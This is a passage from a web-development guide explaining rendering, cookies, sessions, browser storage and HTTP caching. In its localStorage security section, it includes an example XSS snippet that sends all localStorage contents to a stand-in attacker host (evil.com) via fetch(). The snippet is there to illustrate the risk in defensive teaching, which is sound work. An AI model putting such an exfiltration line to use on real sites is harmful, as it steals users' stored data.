# PART XI — Web Mechanics

## A Comprehensive Guide to How the Web Works Under the Hood

---

# Table of Contents

1. HTML/CSS/JS Request-Render Pipeline
2. Cookies & Sessions
3. Local Storage vs Session Storage
4. Web Caching (Browser, Proxy, CDN)
5. Load Balancers
6. Reverse Proxies vs Forward Proxies
7. Web Servers vs Application Servers

---

---

# Chapter 1: The HTML/CSS/JS Request-Render Pipeline

## 1.1 Introduction

Every time you type a URL into a browser and press Enter, an intricate sequence of events unfolds — a pipeline of network requests, file parsing, layout computation, and screen painting. Understanding this pipeline is foundational to building fast, responsive, and reliable web applications. This chapter walks through every stage of that journey, from the first keystroke to the final pixel appearing on screen.

---

## 1.2 Stage 1 — URL Parsing and DNS Resolution

When you type `https://www.example.com/products` and press Enter, the browser begins by parsing the URL into its components:

```
Protocol: https
Host:      www.example.com
Path:      /products
```

The browser does not understand domain names directly — it needs an IP address to connect to. So it performs **DNS Resolution**:

### DNS Resolution Steps

1. **Browser Cache** — The browser first checks its own DNS cache. Chrome, for instance, caches DNS records for a short TTL.
2. **OS Cache** — If not found, it checks the operating system's DNS cache (`/etc/hosts` on Linux/macOS, the hosts file on Windows).
3. **Router Cache** — If not found, the request goes to the local network router, which may have the answer cached.
4. **ISP Recursive Resolver** — The ISP's DNS resolver searches on your behalf.
5. **Root Name Servers** — If the recursive resolver doesn't have it, it queries the root DNS servers (13 groups worldwide) to find who is authoritative for `.com`.
6. **TLD Name Servers** — The resolver asks the `.com` TLD servers who is authoritative for `example.com`.
7. **Authoritative Name Server** — The authoritative DNS server for `example.com` finally returns the IP address.

```
Browser → OS → Router → ISP Resolver → Root → TLD → Authoritative → IP address returned
```

The resolved IP is cached at every layer with a **TTL (Time to Live)** value so future requests skip these steps.

---

## 1.3 Stage 2 — TCP Connection and TLS Handshake

With an IP address in hand, the browser establishes a connection.

### TCP Three-Way Handshake

```
Client  ──── SYN ────────────▶  Server
Client  ◀─── SYN-ACK ────────  Server
Client  ──── ACK ────────────▶  Server
```

This establishes a reliable, ordered communication channel.

### TLS Handshake (for HTTPS)

For secure connections, the **Transport Layer Security (TLS)** handshake happens after the TCP handshake:

1. **Client Hello** — Client sends supported TLS versions, cipher suites, and a random number.
2. **Server Hello** — Server picks the cipher suite, sends its SSL certificate containing its public key.
3. **Certificate Verification** — The client validates the certificate against trusted Certificate Authorities (CAs).
4. **Key Exchange** — Client and server derive a shared symmetric session key (using algorithms like ECDHE).
5. **Finished** — Both sides confirm the handshake with an encrypted "Finished" message.

All subsequent data is encrypted with the shared symmetric key. TLS 1.3 reduces the handshake to 1 round trip, making it faster than TLS 1.2.

---

## 1.4 Stage 3 — HTTP Request

Once the connection is established, the browser sends an HTTP request:

```http
GET /products HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_id=abc123; theme=dark
```

### HTTP Versions

| Version | Key Feature |
|---------|-------------|
| HTTP/1.0 | One request per connection |
| HTTP/1.1 | Persistent connections, pipelining |
| HTTP/2   | Multiplexing, header compression, server push |
| HTTP/3   | Uses QUIC (UDP-based), faster connection setup |

**HTTP/2 multiplexing** allows multiple requests to be in-flight simultaneously on a single TCP connection, eliminating the "head-of-line blocking" problem of HTTP/1.1.

---

## 1.5 Stage 4 — Server Processing and Response

The server receives the request, processes it (potentially querying a database, running application logic), and returns an HTTP response:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Encoding: gzip
Cache-Control: max-age=3600
Content-Length: 12453

<!DOCTYPE html>
<html>
  <head>...</head>
  <body>...</body>
</html>
```

The response body is the raw HTML that the browser will now parse.

---

## 1.6 Stage 5 — HTML Parsing and DOM Construction

The browser receives the HTML byte stream and begins parsing it **incrementally** — it does not wait for the entire document before starting.

### Bytes → Characters → Tokens → Nodes → DOM

```
Bytes ──▶ Characters ──▶ Tokens ──▶ Nodes ──▶ DOM Tree
```

**Step-by-step:**

1. **Bytes to Characters** — The browser reads raw bytes and converts them to characters using the declared charset (usually UTF-8).
2. **Tokenization** — The HTML parser reads characters and produces tokens: `StartTag`, `EndTag`, `Character`, `DOCTYPE`, `Comment`.
3. **Tree Construction** — Tokens are fed into the tree constructor, which builds the **Document Object Model (DOM)** — a tree of node objects representing the HTML structure.

```html
<html>
  <body>
    <h1>Hello World</h1>
    <p>Welcome!</p>
  </body>
</html>
```

Becomes:

```
Document
  └── html
        └── body
              ├── h1
              │     └── "Hello World"
              └── p
                    └── "Welcome!"
```

### Parser Blocking Resources

When the HTML parser encounters certain resources, it may **pause**:

- **`<script>` tags** (without `async` or `defer`): The parser stops, the script is downloaded and executed, then parsing resumes. This is because scripts can modify the DOM using `document.write()`.
- **CSS files**: Do not block HTML parsing directly, but block rendering and JavaScript execution (because JS might query computed styles).

```html
<!-- Blocks parsing — avoid placing in <head> without defer -->
<script src="app.js"></script>

<!-- Deferred: downloads in parallel, executes after HTML parsed -->
<script src="app.js" defer></script>

<!-- Async: downloads in parallel, executes as soon as ready -->
<script src="app.js" async></script>
```

**Real-world implication:** Placing `<script>` tags at the bottom of `<body>` or using `defer` is a standard performance best practice precisely because of this parser-blocking behavior.

---

## 1.7 Stage 6 — CSS Parsing and CSSOM Construction

While parsing HTML, when the browser encounters a `<link rel="stylesheet" href="styles.css">` tag, it fetches the CSS file. CSS is parsed into the **CSS Object Model (CSSOM)** — a tree structure parallel to the DOM.

```css
body { font-size: 16px; }
h1   { color: blue; font-size: 2em; }
p    { color: gray; }
```

Becomes a tree of style rules with specificity calculated, cascade resolved, and values inherited.

**CSSOM blocks rendering.** The browser will not paint anything until the CSSOM is complete, because it needs to know the style of every element before it can render. This is why CSS is called a **render-blocking resource**.

---

## 1.8 Stage 7 — JavaScript Execution

JavaScript is executed by the browser's **JavaScript engine** (V8 in Chrome, SpiderMonkey in Firefox, JavaScriptCore in Safari).

JavaScript can:
- Modify the DOM (`document.createElement`, `innerHTML`)
- Modify the CSSOM (`element.style.color = 'red'`)
- Make additional network requests (`fetch`, `XMLHttpRequest`)
- Register event listeners

Because JS can change both DOM and CSSOM, the browser must pause CSS parsing for JS execution, and vice versa — this interleaving is carefully managed by the browser's main thread.

---

## 1.9 Stage 8 — Render Tree Construction

With both the DOM and CSSOM built, the browser creates the **Render Tree** by combining them.

```
DOM + CSSOM = Render Tree
```

Rules for Render Tree construction:
- Only **visible** nodes are included. Elements with `display: none` are **not** in the Render Tree (unlike `visibility: hidden`, which is included but transparent).
- Each visible DOM node gets matched with its computed CSSOM styles.
- The Render Tree contains visual objects (boxes) with their computed style properties.

---

## 1.10 Stage 9 — Layout (Reflow)

The **Layout** stage (also called **Reflow**) calculates the exact position and size of every element in the Render Tree.

The browser computes:
- Element dimensions (width, height)
- Element positions (x, y coordinates)
- How elements affect each other (floats, flexbox, grid)

This is done using the viewport as the coordinate space. Layout is computed top-down, starting from the root element.

### What Triggers Layout?

Modifying any property that affects geometry causes a reflow:
- Changing `width`, `height`, `margin`, `padding`, `font-size`
- Adding/removing DOM elements
- Reading certain properties (`offsetWidth`, `scrollTop`, `getBoundingClientRect()`) forces the browser to flush pending layouts immediately — this is called **forced synchronous layout** and can cause performance issues.

---

## 1.11 Stage 10 — Paint

**Paint** converts the Render Tree (with positions and styles) into actual pixels. The browser walks the Render Tree and calls painting APIs (rasterization).

Paint considers:
- Background colors and images
- Borders
- Text rendering
- Shadows
- Images

Paint does **not** happen all at once on a single surface. The browser may divide the page into multiple **layers** — independent surfaces that can be painted and composited separately.

### Layers

Certain CSS properties promote an element to its own compositing layer:
- `transform`
- `opacity`
- `will-change`
- `position: fixed`

Having its own layer means changes to that element (e.g., animating a transform) don't require repainting other elements — this is why CSS `transform` animations are much smoother than animating `top`/`left`.

---

## 1.12 Stage 11 — Compositing

**Compositing** is the final stage where all the painted layers are combined (composited) in the correct order and sent to the screen.

The browser's **compositor thread** (separate from the main thread) handles this, using the GPU for acceleration. This is why GPU-accelerated CSS animations are so smooth — they run entirely on the compositor thread without touching the main thread at all.

```
Main Thread:   DOM → CSSOM → Render Tree → Layout → Paint → Layer tiles
Compositor:    Combine layers → GPU → Screen
```

---

## 1.13 The Critical Rendering Path

The **Critical Rendering Path (CRP)** is the sequence of steps the browser must complete before it can display anything meaningful on screen:

```
DNS → TCP → TLS → HTTP Request → HTML (DOM) → CSS (CSSOM) → Render Tree → Layout → Paint → Composite
```

**Optimizing the CRP** is a major area of web performance engineering:

| Technique | Effect |
|-----------|--------|
| Minimize render-blocking CSS | Deliver critical CSS inline |
| Defer non-critical JS | Use `async`/`defer` attributes |
| Use HTTP/2 | Parallel resource loading |
| Compress responses | Gzip/Brotli reduces transfer size |
| Use a CDN | Reduces DNS and TCP latency |
| Preload critical resources | `<link rel="preload">` |

---

## 1.14 Performance Metrics

Modern browsers measure the CRP using standardized metrics:

| Metric | Definition |
|--------|------------|
| **TTFB** (Time to First Byte) | How long until the first byte of response arrives |
| **FCP** (First Contentful Paint) | When any content first appears |
| **LCP** (Largest Contentful Paint) | When the largest content element renders |
| **TTI** (Time to Interactive) | When the page becomes fully interactive |
| **CLS** (Cumulative Layout Shift) | Visual stability — how much layout shifts during load |
| **FID** (First Input Delay) | Responsiveness to first user interaction |

These are Google's **Core Web Vitals** and directly affect SEO rankings.

---

## 1.15 Reflow vs Repaint vs Composite — A Practical Summary

```
Most expensive:  Reflow → Repaint → Composite → Screen
Least expensive: Composite only → Screen
```

**Best practices:**
- Use `transform` and `opacity` for animations (composite only)
- Batch DOM manipulations (use `DocumentFragment`)
- Avoid reading layout properties in a loop (causes forced reflow per iteration)
- Use `requestAnimationFrame` for visual updates

---

---

# Chapter 2: Cookies & Sessions

## 2.1 The Problem: HTTP is Stateless

HTTP is a **stateless protocol** — each request is completely independent. The server has no built-in memory of previous requests. This creates a fundamental challenge: how does a web application remember who you are between requests?

If you log in on one request, how does the server know you're logged in on the next request?

The answer involves two related but distinct mechanisms: **Cookies** and **Sessions**.

---

## 2.2 Cookies

A **cookie** is a small piece of data (up to 4KB) that the server sends to the browser, and the browser automatically sends back on every subsequent request to the same domain.

### Setting a Cookie

The server sets a cookie via the `Set-Cookie` response header:

```http
HTTP/1.1 200 OK
Set-Cookie: username=alice; Expires=Wed, 09 Jun 2025 10:18:14 GMT; Path=/; Domain=example.com; Secure; HttpOnly; SameSite=Strict
```

### Reading the Cookie

On every subsequent request to `example.com`, the browser automatically includes:

```http
GET /dashboard HTTP/1.1
Host: example.com
Cookie: username=alice
```

The server reads this cookie and knows the user is Alice.

---

## 2.3 Cookie Attributes

Each cookie can have several attributes that control its behavior:

### `Name=Value`
The core data stored in the cookie.
```
session_id=abc123xyz
```

### `Expires` / `Max-Age`
Controls when the cookie expires.

```http
Set-Cookie: pref=dark; Expires=Fri, 01 Jan 2026 00:00:00 GMT
Set-Cookie: pref=dark; Max-Age=31536000  /* 1 year in seconds */
```

- If neither is set, the cookie is a **session cookie** — it expires when the browser is closed.
- `Max-Age` takes precedence over `Expires` if both are present.

### `Domain`
Specifies which domains receive the cookie.

```http
Set-Cookie: token=xyz; Domain=example.com
```

- If set to `example.com`, the cookie is sent to `example.com` AND all subdomains (`api.example.com`, `www.example.com`).
- If omitted, only the exact domain that set it receives the cookie.

### `Path`
Restricts the cookie to a specific URL path.

```http
Set-Cookie: admin_token=xyz; Path=/admin
```

This cookie is only sent for requests starting with `/admin`, not for `/`, `/products`, etc.

### `Secure`
The cookie is only sent over **HTTPS** connections. Prevents transmission over unencrypted HTTP.

```http
Set-Cookie: session=abc; Secure
```

### `HttpOnly`
The cookie **cannot be accessed by JavaScript** (`document.cookie`). This is crucial for security — it prevents XSS attacks from stealing session cookies.

```http
Set-Cookie: session=abc; HttpOnly
```

```javascript
// With HttpOnly, this returns nothing or throws an error
console.log(document.cookie); // Session cookie not visible
```

### `SameSite`
Controls whether the cookie is sent with cross-site requests. Protects against **CSRF (Cross-Site Request Forgery)** attacks.

```http
Set-Cookie: session=abc; SameSite=Strict
Set-Cookie: session=abc; SameSite=Lax
Set-Cookie: session=abc; SameSite=None; Secure
```

| Value | Behavior |
|-------|----------|
| `Strict` | Cookie never sent with cross-site requests |
| `Lax` | Cookie sent with top-level navigations (clicking a link) but not sub-requests (images, iframes) |
| `None` | Cookie always sent; must be combined with `Secure` |

**Real-world example:** If you're logged into `bank.com` and visit `evil.com`, an attack page might try to make your browser send a request to `bank.com/transfer?to=hacker`. With `SameSite=Strict`, the `bank.com` session cookie won't be included in that cross-origin request.

---

## 2.4 Cookie Types in Practice

### Session Cookies
Temporary, expires when browser closes. No `Expires`/`Max-Age` attribute.

```http
Set-Cookie: session_id=abc123
```

### Persistent Cookies
Have an expiration date. Survive browser restarts.

```http
Set-Cookie: remember_me=xyz; Max-Age=2592000  /* 30 days */
```

### Third-Party Cookies
Set by a domain different from the one you're visiting. Used by advertising networks to track users across sites. Increasingly blocked by browsers (Safari blocks them by default, Chrome is phasing them out).

### First-Party Cookies
Set by the domain you're directly visiting. Used for sessions, preferences, analytics by the site itself.

---

## 2.5 Sessions

While cookies can store data directly in the browser, there are problems with doing so:

1. **Size limit**: Cookies are limited to 4KB.
2. **Security**: Sensitive data stored in a cookie could be tampered with by the user.
3. **Bandwidth**: Cookies are sent on every request.

**Sessions** solve this by storing the actual data on the **server** and giving the client only a **session ID** — an opaque token that serves as a lookup key.

### How Sessions Work

```
1. User logs in → Server creates a session object and stores it
2. Server generates a unique session ID (e.g., UUID)
3. Server sends session ID to browser as a cookie: Set-Cookie: session_id=a1b2c3
4. Browser stores the session ID cookie
5. On every request, browser sends: Cookie: session_id=a1b2c3
6. Server looks up session data by ID and retrieves the user's state
```

### Session Storage on the Server

Sessions are stored on the server in various ways:

**In-Memory (default for many frameworks)**
```
Server RAM: { "a1b2c3": { userId: 42, username: "alice", role: "admin" } }
```
Simple but doesn't work with multiple servers (each server has different memory).

**Database Storage**
```sql
CREATE TABLE sessions (
  session_id VARCHAR(128) PRIMARY KEY,
  user_id    INT,
  data       JSON,
  created_at TIMESTAMP,
  expires_at TIMESTAMP
);
```

**Redis (most common in production)**
```
Redis: SETEX session:a1b2c3 3600 '{"userId":42,"username":"alice"}'
```
Redis is an in-memory data store with persistence. It's fast, supports TTL (auto-expiry), and is accessible from multiple application servers — making it the industry standard for session storage.

---

## 2.6 Session Example in Express.js

```javascript
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const redis = require('redis');

const client = redis.createClient();
const app = express();

app.use(session({
  store: new RedisStore({ client }),
  secret: 'my-secret-key',       // Used to sign the session ID cookie
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 1000 * 60 * 60 * 24  // 24 hours
  }
}));

// Login endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Verify credentials...
  if (validCredentials(username, password)) {
    req.session.userId = getUserId(username);
    req.session.username = username;
    req.session.role = getUserRole(username);
    res.json({ message: 'Logged in' });
  }
});

// Protected endpoint
app.get('/dashboard', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  res.json({ message: `Welcome, ${req.session.username}` });
});
```

---

## 2.7 Cookie-Based Sessions vs Token-Based Sessions (JWT)

A modern alternative to server-side sessions is **JSON Web Tokens (JWT)** stored in cookies or local storage.

| Feature | Server-Side Sessions | JWT |
|---------|---------------------|-----|
| Storage | Server (Redis/DB) | Client (cookie/localStorage) |
| Stateless | No (server must check store) | Yes (self-contained) |
| Revocation | Easy (delete session) | Hard (requires blacklist) |
| Scalability | Requires shared session store | No server storage needed |
| Size | Session ID is tiny | JWT can be large (contains claims) |
| Security | Session data never leaves server | Payload visible (if not encrypted) |

**Real-world usage:**
- **E-commerce sites** (Amazon, eBay): Server-side sessions with Redis — need ability to immediately revoke sessions.
- **APIs and SPAs** (single-page applications): JWTs are popular for stateless authentication.
- **Microservices**: JWTs work well because services can verify tokens independently without calling a central session store.

---

## 2.8 Security Considerations

### Session Fixation Attack
An attacker sets a known session ID before the victim logs in. After login, the attacker uses that session ID.

**Prevention:** Regenerate the session ID upon login:
```javascript
req.session.regenerate(() => {
  req.session.userId = user.id;
});
```

### Session Hijacking
An attacker steals a valid session ID (via XSS, network sniffing) and uses it.

**Prevention:**
- Use `HttpOnly` cookies (prevents XSS theft)
- Use `Secure` flag (prevents network sniffing)
- Short session TTLs
- Bind sessions to IP address or user agent (with care)

### CSRF Attack
A malicious site tricks the user's browser into making authenticated requests.

**Prevention:**
- `SameSite=Strict` cookies
- CSRF tokens (server-generated token in forms, verified server-side)

---

---

# Chapter 3: Local Storage vs Session Storage

## 3.1 Introduction

The Web Storage API provides two mechanisms — **`localStorage`** and **`sessionStorage`** — for storing key-value pairs in the browser, beyond cookies. They were introduced to overcome cookie limitations and provide a cleaner client-side storage mechanism.

Both APIs are part of the `window` object and use identical methods. The critical difference is their **lifetime and scope**.

---

## 3.2 localStorage

**`localStorage`** provides persistent storage that survives browser restarts and tab closures. Data remains until explicitly deleted by the application or the user clears browser data.

### Characteristics
- **Capacity**: ~5-10 MB (varies by browser)
- **Scope**: Per origin (`protocol + domain + port`)
- **Persistence**: Indefinite (survives browser close, system restart)
- **Access**: JavaScript only (not sent with HTTP requests)
- **Threads**: Main thread only (not accessible in Web Workers without workarounds)

### API

```javascript
// Store data
localStorage.setItem('username', 'alice');
localStorage.setItem('preferences', JSON.stringify({ theme: 'dark', fontSize: 16 }));

// Retrieve data
const username = localStorage.getItem('username');           // "alice"
const prefs = JSON.parse(localStorage.getItem('preferences')); // { theme: 'dark', fontSize: 16 }

// Check existence
if (localStorage.getItem('username') !== null) {
  console.log('Username is set');
}

// Remove a specific item
localStorage.removeItem('username');

// Clear all localStorage for this origin
localStorage.clear();

// Get number of stored items
console.log(localStorage.length); // e.g., 1

// Iterate over all items
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  console.log(key, localStorage.getItem(key));
}
```

### Important: Only Strings

`localStorage` stores everything as strings. Storing objects directly results in `"[object Object]"`.

```javascript
// Wrong
localStorage.setItem('user', { name: 'alice' });
localStorage.getItem('user'); // "[object Object]" — useless

// Correct
localStorage.setItem('user', JSON.stringify({ name: 'alice' }));
const user = JSON.parse(localStorage.getItem('user')); // { name: 'alice' }
```

### Storage Event

When `localStorage` is modified in one tab, other tabs on the same origin receive a `storage` event:

```javascript
window.addEventListener('storage', (event) => {
  console.log('Key changed:', event.key);
  console.log('Old value:', event.oldValue);
  console.log('New value:', event.newValue);
  console.log('Origin:', event.url);
});
```

**Real-world use case:** Syncing login state across tabs — if a user logs out in one tab, other tabs receive the storage event and redirect to the login page.

---

## 3.3 sessionStorage

**`sessionStorage`** is identical in API to `localStorage` but has a much narrower scope and lifetime.

### Characteristics
- **Capacity**: ~5-10 MB
- **Scope**: Per origin **AND per tab/window**
- **Persistence**: Only for the duration of the **page session** (cleared when tab closes)
- **Access**: JavaScript only
- **Isolation**: Completely isolated between tabs, even on the same origin

### Key Distinction from localStorage

```javascript
// Tab 1 at example.com
sessionStorage.setItem('cart', 'item-123');

// Tab 2 at example.com (NEW TAB — separate session)
sessionStorage.getItem('cart'); // null — completely isolated
```

```javascript
// Tab 1 at example.com
localStorage.setItem('cart', 'item-123');

// Tab 2 at example.com (same origin)
localStorage.getItem('cart'); // "item-123" — shared!
```

### API (Identical to localStorage)

```javascript
sessionStorage.setItem('stepOneData', JSON.stringify({ name: 'Alice', age: 30 }));
const data = JSON.parse(sessionStorage.getItem('stepOneData'));
sessionStorage.removeItem('stepOneData');
sessionStorage.clear();
```

### Tab Duplication Behavior

When a user duplicates a tab (Ctrl+Shift+K in Firefox, for example), the new tab gets a **copy** of the original tab's `sessionStorage` at the moment of duplication — but they are now independent and changes in one don't affect the other.

---

## 3.4 Comparison: localStorage vs sessionStorage vs Cookies

| Feature | localStorage | sessionStorage | Cookies |
|---------|--------------|----------------|---------|
| Capacity | ~5-10 MB | ~5-10 MB | ~4 KB |
| Persistence | Indefinite | Tab session | Configurable (session/expiry) |
| Sent with requests | No | No | Yes (automatically) |
| Accessible via JS | Yes | Yes | Yes (unless HttpOnly) |
| Server-readable | No | No | Yes |
| Cross-tab sharing | Yes | No | Yes |
| Cross-domain | No | No | Per domain settings |
| Expiration control | No | Automatic (tab close) | Yes |

---

## 3.5 Real-World Use Cases

### localStorage Use Cases

**1. User Preferences**
```javascript
// Save theme preference
function setTheme(theme) {
  document.body.className = theme;
  localStorage.setItem('theme', theme);
}

// Restore on page load
const savedTheme = localStorage.getItem('theme') || 'light';
setTheme(savedTheme);
```

**2. Caching API Responses**
```javascript
async function getProductList() {
  const cached = localStorage.getItem('productList');
  const cacheTime = localStorage.getItem('productListTime');
  
  // Use cache if less than 10 minutes old
  if (cached && cacheTime && Date.now() - cacheTime < 600000) {
    return JSON.parse(cached);
  }
  
  const response = await fetch('/api/products');
  const data = await response.json();
  
  localStorage.setItem('productList', JSON.stringify(data));
  localStorage.setItem('productListTime', Date.now().toString());
  
  return data;
}
```

**3. Draft Auto-Save**
```javascript
const editor = document.getElementById('article-editor');

editor.addEventListener('input', () => {
  localStorage.setItem('draft', editor.value);
  localStorage.setItem('draftTime', new Date().toISOString());
});

// Restore draft on load
window.addEventListener('load', () => {
  const draft = localStorage.getItem('draft');
  if (draft) {
    editor.value = draft;
    console.log('Draft restored from', localStorage.getItem('draftTime'));
  }
});
```

### sessionStorage Use Cases

**1. Multi-Step Form Wizard**
```javascript
// Step 1 page
function saveStep1Data(formData) {
  sessionStorage.setItem('step1', JSON.stringify({
    name: formData.name,
    email: formData.email
  }));
}

// Step 2 page
function loadStep1Data() {
  const step1 = sessionStorage.getItem('step1');
  return step1 ? JSON.parse(step1) : null;
}

// Final submission — combine all steps
function submitAll() {
  const step1 = JSON.parse(sessionStorage.getItem('step1'));
  const step2 = JSON.parse(sessionStorage.getItem('step2'));
  
  fetch('/api/register', {
    method: 'POST',
    body: JSON.stringify({ ...step1, ...step2 })
  });
  
  sessionStorage.clear(); // Cleanup
}
```

**2. Referral Tracking (per visit)**
```javascript
// On landing page
const referrer = document.referrer || 'direct';
sessionStorage.setItem('referrer', referrer);
sessionStorage.setItem('landingPage', window.location.href);

// On conversion page
const conversion = {
  referrer: sessionStorage.getItem('referrer'),
  landingPage: sessionStorage.getItem('landingPage'),
  convertedPage: window.location.href
};
// Send to analytics
```

**3. One-Time Notices (within a session)**
```javascript
// Show the welcome notification only once per session
if (!sessionStorage.getItem('welcomeShown')) {
  showWelcomeNotification();
  sessionStorage.setItem('welcomeShown', 'true');
}
```

---

## 3.6 Security Considerations

### Never Store Sensitive Data

```javascript
// NEVER do this
localStorage.setItem('password', 'mypassword123');
localStorage.setItem('creditCard', '4111-1111-1111-1111');
localStorage.setItem('authToken', 'super-secret-jwt'); // Debatable but risky
```

**Why?** Any JavaScript running on the page can read `localStorage`:
- XSS attacks can steal all `localStorage` data
- Browser extensions can access it
- Third-party scripts have access

### XSS Vulnerability

```javascript
// If an attacker injects this script via XSS:
const stollenData = JSON.stringify(localStorage);
fetch('https://evil.com/steal?data=' + encodeURIComponent(stollenData));
// All localStorage data is now sent to the attacker
```

### Contrast with HttpOnly Cookies

`HttpOnly` session cookies cannot be read by JavaScript at all, making them immune to XSS-based theft of the cookie value. This is why **session tokens should be stored in HttpOnly cookies**, not localStorage.

---

## 3.7 Storage Quotas and Errors

When storage is full, browsers throw a `QuotaExceededError`:

```javascript
try {
  localStorage.setItem('bigData', largeString);
} catch (e) {
  if (e.name === 'QuotaExceededError') {
    console.error('Storage quota exceeded. Clearing old cache...');
    // Remove old/less important items
    localStorage.removeItem('cachedData_old');
    // Try again
    localStorage.setItem('bigData', largeString);
  }
}
```

---

---

# Chapter 4: Web Caching

## 4.1 The Purpose of Caching

Fetching data over the network is expensive — it takes time (latency) and consumes bandwidth. The fundamental idea behind **caching** is storing a copy of a response so that future requests for the same resource can be served faster, without going all the way back to the origin server.

Caching exists at multiple layers:

```
Browser Cache → Proxy Cache → CDN Cache → Origin Server
```

Each layer can potentially serve the request, eliminating the need for more "expensive" upstream layers.

---

## 4.2 HTTP Cache Headers

Before diving into each caching layer, it's essential to understand the HTTP headers that control caching behavior, since they apply across all layers.

### `Cache-Control`

The most important caching header. It can appear in both responses (server to client) and requests (client to server).

```http
Cache-Control: max-age=3600, public
```

**Response directives:**

| Directive | Meaning |
|-----------|---------|
| `max-age=N` | Response is fresh for N seconds |
| `s-maxage=N` | Override `max-age` for shared caches (CDNs, proxies) |
| `public` | Response can be cached by any cache (browsers, CDNs) |
| `private` | Response can only be cached by the browser (not CDNs) |
| `no-cache` | Can cache but must revalidate before using |
| `no-store` | Never cache the response anywhere |
| `must-revalidate` | Must revalidate with origin when stale |
| `immutable` | Response will never change (safe to cache forever) |

**Request directives (sent by browsers):**

| Directive | Meaning |
|-----------|---------|
| `no-cache` | Request fresh response from server |
| `no-store` | Don't store the response |
| `max-stale=N` | Accept a stale response up to N seconds old |

### `ETag`

An **Entity Tag** is a unique identifier for a specific version of a resource, like a fingerprint.

```http
HTTP/1.1 200 OK
ETag: "abc123def456"
Content-Type: text/html
```

The browser stores this. On the next request:

```http
GET /index.html HTTP/1.1
If-None-Match: "abc123def456"
```

If the resource hasn't changed:
```http
HTTP/1.1 304 Not Modified
ETag: "abc123def456"
```

No body is sent — the browser uses its cached copy. This is called **conditional request** or **cache validation**.

### `Last-Modified` / `If-Modified-Since`

Older alternative to ETag using timestamps:

```http
HTTP/1.1 200 OK
Last-Modified: Tue, 01 Oct 2024 12:00:00 GMT
```

Next request:
```http
GET /style.css HTTP/1.1
If-Modified-Since: Tue, 01 Oct 2024 12:00:00 GMT
```

Response if unchanged:
```http
HTTP/1.1 304 Not Modified
```

### `Expires`

Older alternative to `max-age` — specifies an absolute expiry time:

```http
Expires: Wed, 01 Jan 2025 12:00:00 GMT
```

`Cache-Control: max-age` takes precedence over `Expires` when both are present.

### `Vary`

Tells caches that the response varies based on request headers:

```http
Vary: Accept-Encoding
Vary: Accept-Language
```

If `Vary: Accept-Encoding`, caches store separate versions for gzip and non-gzip requests. This is important for compressed responses.

---

## 4.3 Browser Cache

The **browser cache** (also called the HTTP cache or disk cache) stores HTTP responses locally on the user's device. It is the first cache layer checked on every request.

### How It Works

```
Browser makes request for /style.css
    │
    ▼
Is it in browser cache?
    │
    ├── No → Fetch from server → Cache the response → Return to browser
    │
    └── Yes → Is it fresh (max-age not expired)?
                  │
                  ├── Yes → Return cached copy immediately (no network request)
                  │
                  └── No (stale) → Send conditional request (If-None-Match)
                                        │
                                        ├── 304 Not Modified → Use cached copy, update freshness
                                        └── 200 OK → New content → Cache and return
```

### Cache Storage Locations

Modern browsers maintain multiple caches:
- **Memory cache**: Very fast, stores resources used in current page session (lost when tab closes)
- **Disk cache**: Persistent, survives browser restarts
- **Service Worker cache**: Programmable cache controlled by a Service Worker script

### Practical Cache-Control Strategies

**Static assets (CSS, JS, images) with versioned URLs:**
```http
Cache-Control: public, max-age=31536000, immutable
```
The `immutable` hint tells the browser not to revalidate even when the user does a forced refresh. Works because assets use content-hashed URLs:
```html
<link rel="stylesheet" href="/style.abc123.css">
<script src="/app.def456.js"></script>
```
When the CSS changes, the URL changes — so the browser sees it as a completely new resource.

**HTML pages (change often):**
```http
Cache-Control: no-cache
```
The browser can cache it but must revalidate every time. Combined with ETag, this means a 304 response when the page hasn't changed — fast but always fresh.

**Sensitive user-specific content:**
```http
Cache-Control: private, no-store
```
Never cache — banking pages, personal dashboards, checkout pages.

**API responses:**
```http
Cache-Control: private, max-age=60
```
User-specific data cached briefly in the browser cache.

### Busting the Cache

If you need to change a cached resource before it expires:
1. **URL versioning** — Append a version or hash: `app.v2.js`, `style.1a2b3c.css`
2. **Query string** — `app.js?v=2` (less reliable, some caches ignore query strings)
3. **Cache-Control headers** — Change `max-age` to 0 or add `no-cache`

---

## 4.4 Proxy Cache

A **proxy cache** (also called a **shared cache** or **intermediary cache**) sits between clients and servers, caching responses for multiple users.

```
[User A] ──────┐
[User B] ──────┼──── Proxy Cache ──── Origin Server
[User C] ──────┘
```

When User A requests `/home`, the proxy fetches it from the origin and caches it. When User B and C request the same `/home`, the proxy serves them from cache — the origin server is never contacted again.

### Types of Proxy Caches

**Forward Proxy Cache (Explicit Proxy)**
- Sits on the client side of the network (e.g., corporate network proxy)
- Configured explicitly in the client's network settings
- Used by organizations to cache content for employees, reduce bandwidth costs
- ISPs historically used transparent proxies for similar purposes

**Transparent Proxy Cache**
- Intercepts traffic without client configuration
- Used by ISPs and corporate networks invisibly
- Less common now due to HTTPS (can't intercept encrypted traffic)

### Cache-Control for Shared Caches

```http
Cache-Control: public, max-age=3600, s-maxage=86400
```

- `max-age=3600` — Browser caches for 1 hour
- `s-maxage=86400` — Shared caches (proxies, CDNs) cache for 24 hours

Shared caches only store `public` responses. `private` responses (user-specific) are not shared.

---

## 4.5 CDN Caching

A **Content Delivery Network (CDN)** is a globally distributed network of proxy cache servers (called **PoPs** — Points of Presence or edge nodes) deployed in data centers around the world.

### Why CDNs Exist

If your origin server is in New York:
- A user in New York: ~5ms latency
- A user in London: ~80ms latency
- A user in Tokyo: ~150ms latency

With a CDN that has PoPs in London and Tokyo:
- The Tokyo user gets content from the Tokyo PoP: ~5ms instead of ~150ms

### CDN Architecture

```
Origin Server (New York)
    │
    ├── CDN PoP (New York)
    ├── CDN PoP (London)
    ├── CDN PoP (Tokyo)
    ├── CDN PoP (Sydney)
    └── CDN PoP (São Paulo)
```

### CDN Cache Behavior

